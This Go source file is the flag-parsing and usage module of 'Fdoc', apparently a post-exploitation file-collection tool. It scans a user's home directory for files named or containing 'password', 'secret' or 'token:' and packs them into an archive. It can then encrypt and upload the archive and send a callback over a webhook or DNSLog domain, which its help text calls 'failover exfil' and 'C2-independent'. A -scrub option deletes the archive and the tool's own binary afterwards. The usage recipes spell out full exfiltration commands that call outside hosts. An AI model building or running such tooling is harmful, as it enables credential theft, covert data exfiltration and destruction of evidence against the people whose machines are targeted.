package option

import (
	"Fdoc/logx"
	"Fdoc/utils"
	"crypto/rand"
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"os/user"
	"runtime"
	"strings"
	"time"
)

// FlagInfo holds all CLI flags.
type FlagInfo struct {
	MaxSize      string
	MaxFileSize  string
	OutputPath   string
	AfterDateStr string
	RootPath     string
	SkipDirs     string
	FileName     string
	Keyword      string
	Extension    string
	Size         bool
	Quiet        bool
	Verbose      bool

	// Upload / callback / scrub
	Upload     bool
	Backend    string
	Force      bool
	Webhook    string
	DNS        string
	TaskID     string
	CBTimeout  time.Duration
	Scrub      bool
	Encrypt    bool
	EncryptKey string
}

// InitFlag parses flags and validates inputs.
func (info *FlagInfo) InitFlag() {
	info.GetFlag()
	logx.SetQuiet(info.Quiet)
	logx.SetDebug(info.Verbose)
	info.validateFlags()
	info.initRootPath()
	info.applyDefaultSkipDirs()
	info.checkDirectory(info.RootPath, "directory does not exist")
	if !info.Size {
		info.checkFileExistence(info.OutputPath, "output tar.gz already exists, choose another path")
	}
	info.logDebugInfo()
}

func (info *FlagInfo) validateFlags() {
	if _, err := utils.ParseSize(info.MaxSize); err != nil {
		logx.Error("invalid -max %q: %v", info.MaxSize, err)
		os.Exit(1)
	}
	if info.MaxFileSize != "0" {
		if _, err := utils.ParseSize(info.MaxFileSize); err != nil {
			logx.Error("invalid -max-file %q: %v", info.MaxFileSize, err)
			os.Exit(1)
		}
	}
	if info.AfterDateStr != "" {
		if _, err := time.ParseInLocation("2006-01-02", info.AfterDateStr, time.Local); err != nil {
			logx.Error("invalid -t date %q (want YYYY-MM-DD): %v", info.AfterDateStr, err)
			os.Exit(1)
		}
	}
	if info.Upload && info.Size {
		logx.Error("-upload cannot be used with -size")
		os.Exit(1)
	}
	if info.Upload {
		if info.Webhook == "" && info.DNS == "" {
			logx.Error("-upload requires -webhook and/or -dns for result callback")
			os.Exit(1)
		}
	}
	if info.Encrypt && info.EncryptKey == "" {
		logx.Error("-encrypt requires -key")
		os.Exit(1)
	}
	if info.CBTimeout <= 0 {
		info.CBTimeout = 15 * time.Second
	}
	if info.Upload && info.TaskID == "" {
		info.TaskID = genTaskID()
	}
}

func genTaskID() string {
	var b [4]byte
	if _, err := rand.Read(b[:]); err != nil {
		return fmt.Sprintf("t%d", time.Now().UnixNano()%1e9)
	}
	return hex.EncodeToString(b[:])
}

// GetFlag registers and parses CLI flags.
func (info *FlagInfo) GetFlag() {
	flag.Usage = printUsage
	flag.StringVar(&info.MaxSize, "max", "1GB", "max total logical size of matched files (cumulative; packing stops at limit and keeps archive)")
	flag.StringVar(&info.MaxFileSize, "max-file", "100MB", "skip a single file larger than this logical size; 0 disables")
	flag.StringVar(&info.OutputPath, "o", "", "output archive path")
	flag.StringVar(&info.AfterDateStr, "t", "", "only include files modified on/after this date (local), e.g. 2023-10-01")
	flag.StringVar(&info.RootPath, "d", "", "root path to scan (default: user home)")
	flag.StringVar(&info.SkipDirs, "x", "", "comma-separated directories to skip (absolute or relative to -d)")
	flag.StringVar(&info.FileName, "f", "", "fuzzy filename match (OR within list); AND with other filters. e.g. config,password")
	flag.StringVar(&info.Keyword, "k", "", "content keyword match (OR within list); AND with other filters. e.g. password:,token:")
	flag.StringVar(&info.Extension, "e", "documents", "extension filter (OR within list). presets: documents (default), all=common docs+archives+txt, archives|packages, images, videos, any=no ext filter")
	flag.BoolVar(&info.Size, "size", false, "measure matched size only (disk + logical); does not pack. respects -max/-max-file")
	flag.BoolVar(&info.Quiet, "q", false, "quiet mode")
	flag.BoolVar(&info.Verbose, "v", false, "verbose mode, print matched file paths")

	flag.BoolVar(&info.Upload, "upload", false, "after packing, upload archive (auto backend by size) and callback")
	flag.StringVar(&info.Backend, "b", "", "pin upload backend (default: auto probe+failover by archive size)")
	flag.BoolVar(&info.Force, "force", false, "allow flaky/down upload backends")
	flag.StringVar(&info.Webhook, "webhook", "", "HTTPS callback URL (POST JSON with download url)")
	flag.StringVar(&info.DNS, "dns", "", "DNSLog / callback base domain for failover exfil")
	flag.StringVar(&info.TaskID, "task-id", "", "task id in callback payload (auto-generated if empty)")
	var cbTimeoutSec float64
	flag.Float64Var(&cbTimeoutSec, "cb-timeout", 15, "webhook timeout seconds")
	flag.BoolVar(&info.Scrub, "scrub", false, "after successful upload+callback, delete archive and self binary")
	flag.BoolVar(&info.Encrypt, "encrypt", false, "encrypt archive stream before upload")
	flag.StringVar(&info.EncryptKey, "key", "", "encryption key (required with -encrypt); not the same as -k keyword")

	flag.Parse()
	info.CBTimeout = time.Duration(cbTimeoutSec * float64(time.Second))

	if info.OutputPath == "" {
		info.OutputPath = fmt.Sprintf("output_%s.tar.gz", time.Now().Format("20060102_150405"))
	}
}

func printUsage() {
	out := flag.CommandLine.Output()
	fmt.Fprintf(out, `Fdoc - collect matching files into a tar.gz archive.

Filters (-e/-f/-k/-t) combine with AND; comma-separated values inside one flag use OR.
Defaults: -e documents, -max 1GB, -max-file 100MB, OS-specific skip dirs.

Common recipes:
  1) Probe size first, then pack
       Fdoc -d /data -e documents -size
       Fdoc -d /data -e documents -max 500MB -o docs.tar.gz

  2) Pack home docs quietly (default filters)
       Fdoc -q -o docs.tar.gz

  3) Find by name or content keywords
       Fdoc -d C:\Users -f password,secret -e any -o hits.tar.gz
       Fdoc -d /home -e txt,ini,conf -k token:,password: -o hits.tar.gz

  4) Recent files only
       Fdoc -d /data -e documents -t 2024-01-01 -o recent.tar.gz

  5) Broader types / no ext filter
       Fdoc -e all -size          # common docs+archives+txt (not every file)
       Fdoc -e any -f config -max-file 0 -o cfg.tar.gz

  6) Pack, auto-upload, callback (C2-independent)
       Fdoc -d /data -e documents -o /tmp/x.tar.gz -upload \
         -webhook https://your.host/hook -dns xxx.dnslog.cn -scrub -q

Notes:
  -size reports disk + logical; -max uses logical budget and keeps a partial archive.
  Exit codes: 0=ok, 1=error, 2=truncated at -max.
  -x replaces default skip dirs when set.
  Inaccessible paths are skipped quietly; count is shown in the final summary (-v lists each).
  -upload defaults to auto backend selection by archive size; -b pins a backend.
  -webhook is an HTTPS URL that accepts POST JSON; -dns is a DNSLog base domain.
  -scrub runs only after successful upload+callback; omit it to keep local files.

`)
	fmt.Fprintf(out, "Usage of %s:\n", os.Args[0])
	flag.PrintDefaults()
}

func (info *FlagInfo) initRootPath() {
	if info.RootPath != "" {
		return
	}
	currentUser, err := user.Current()
	if err != nil {
		logx.Warning("failed to get current user: %v", err)
		os.Exit(1)
	}
	logx.Debug("user home: %s", currentUser.HomeDir)
	info.RootPath = currentUser.HomeDir
}

func (info *FlagInfo) applyDefaultSkipDirs() {
	if info.SkipDirs != "" {
		return
	}
	switch runtime.GOOS {
	case "windows":
		info.SkipDirs = `C:\Windows,C:\Program Files,C:\Program Files (x86),C:\inetpub,C:\Users\Public`
	case "darwin":
		// Skip bulky / TCC-protected trees that commonly yield "operation not permitted".
		info.SkipDirs = strings.Join([]string{
			".Trash",
			".docker",
			"Library/Caches",
			"Library/Containers",
			"Library/Group Containers",
			"Library/Logs",
			"Library/Mail",
			"Library/Messages",
			"Library/Safari",
			"Library/HomeKit",
			"Library/IdentityServices",
			"Library/Suggestions",
			"Library/Shortcuts",
			"Library/Application Support/MobileSync",
			"Library/Application Support/Steam",
			"Pictures/Photos Library.photoslibrary",
		}, ",")
	case "linux":
		info.SkipDirs = strings.Join([]string{
			".cache",
			".local/share/Trash",
			".docker",
			".Trash",
			"snap",
		}, ",")
	}
}

func (info *FlagInfo) checkDirectory(path string, errMsg string) {
	if _, err := os.Stat(path); os.IsNotExist(err) {
		logx.Error("%s: %s", errMsg, path)
		os.Exit(1)
	}
}

func (info *FlagInfo) checkFileExistence(path string, errMsg string) {
	if _, err := os.Stat(path); err == nil {
		logx.Error("%s: %s", errMsg, path)
		os.Exit(1)
	}
}

func (info *FlagInfo) logDebugInfo() {
	logx.Debug("MaxSize=%s", info.MaxSize)
	logx.Debug("MaxFileSize=%s", info.MaxFileSize)
	logx.Debug("OutputPath=%s", info.OutputPath)
	logx.Debug("AfterDateStr=%s", info.AfterDateStr)
	logx.Debug("RootPath=%s", info.RootPath)
	logx.Debug("SkipDirs=%s", info.SkipDirs)
	logx.Debug("FileName=%s", info.FileName)
	logx.Debug("Keyword=%s", info.Keyword)
	logx.Debug("Extension=%s", info.Extension)
	logx.Debug("Upload=%v Backend=%q Webhook=%q DNS=%q TaskID=%q Scrub=%v",
		info.Upload, info.Backend, info.Webhook, info.DNS, info.TaskID, info.Scrub)
}
